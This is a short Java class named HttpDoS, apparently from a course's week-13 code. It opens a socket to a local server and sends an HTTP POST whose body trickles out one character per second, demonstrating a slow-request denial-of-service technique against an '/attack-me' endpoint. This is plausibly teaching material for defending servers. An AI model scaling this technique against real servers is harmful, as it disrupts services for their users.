package dk.cphbusiness.week13.code;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.CharBuffer;

public class HttpDoS {
    private static byte[] bytes = new byte[10000];
    private static int count = 0;
        
    public static void main(String... args) {
        String HOST = "127.0.0.1";
        int PORT = 4711;

        try (Socket socket = new Socket(HOST, PORT)) {

            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            out.println("POST /attack-me HTTP/1.1");
            out.println("Content-Type: text/plain");
            out.println("Content-Length: 12");
            out.println();
            for (int i = 0; i < 12; i++) {
                out.print("Hello World!".charAt(i));
                out.flush();
                Thread.sleep(1000);
                }
            
            count = socket.getInputStream().read(bytes);
            String text = new String(bytes, 0, count, "UTF-8");
            System.out.println(text);
            }
        catch (Exception e) {
            System.err.println("!! "+e);
            }
        
        }

    }
